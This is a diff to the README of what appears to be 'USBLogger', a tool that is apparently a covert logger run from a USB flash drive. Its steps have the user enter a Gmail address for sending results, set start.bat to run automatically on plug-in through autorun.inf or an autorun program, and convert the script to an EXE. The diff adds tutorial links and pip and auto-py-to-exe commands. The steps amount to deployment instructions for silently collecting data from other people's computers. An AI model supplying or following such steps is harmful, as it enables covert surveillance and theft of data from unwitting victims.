@@ -133,9 +133,20 @@ Step 3: Replace The * Your Gmail Email Address Here * On Line 177.
 
 Step 4: Save The Python Script.
 
-Step 5:  Copy The Files To Your USB Flash Drive. And Make It Run The start.bat Automatically When Plugged In With An autorun.inf Or The One Provided In This Repository (ONLY WORKS ON SOME COMPUTERS!) Or You Can Use An Autorun Program (VERY RECOMMENDED AND WORKS ON ALL PCS) To Make It Run (The start.bat/ Exe File That You Coverted) Automatically When Plugged In.
+Step 5:  Copy The Files To Your USB Flash Drive. And Make It Run The start.bat Automatically When Plugged In With An autorun.inf Or The One Provided In This Repository (ONLY WORKS ON SOME COMPUTERS!) Or You Can Use An Autorun Program (VERY RECOMMENDED AND WORKS ON ALL PCS) To Make It Run (The start.bat/ Exe File That You Coverted) Automatically When Plugged In. Tutorial For The Autorun Program: https://www.youtube.com/watch?v=g1-Rvi6EE8s&t=117s
 
-Step 6, (RECOMMENDED BUT OPTIONAL): Convert The Python Script Into An EXE With Auto-Py-To-EXE And Delete The start.bat. Tutorial On How To Convert A Python Script Into EXE: https://www.youtube.com/watch?v=xJAM8_Lx5mY
+Step 6, (RECOMMENDED BUT OPTIONAL): If You Want To Convert The Python Script Into An EXE Then Convert It From The Executable Version Folder From USBLogger Original Edition Folder, Then With Auto-Py-To-Exe You Can Convert It And Delete The start.bat. Tutorial On How To Convert A Python Script Into EXE: https://www.youtube.com/watch?v=xJAM8_Lx5mY Or Just Paste In The Terminal:
+```bash
+pip install auto-py-to-exe
+```
+If You Have 1 Version Of Python:
+```bash
+auto-py-to-exe
+```
+If You Have Multiple Versions Of Python:
+```bash
+python -m auto_py_to_exe
+```
 
 # TUTORIAL FOR THE AUTORUN PROGRAM: https://www.youtube.com/watch?v=g1-Rvi6EE8s&t=117s
 
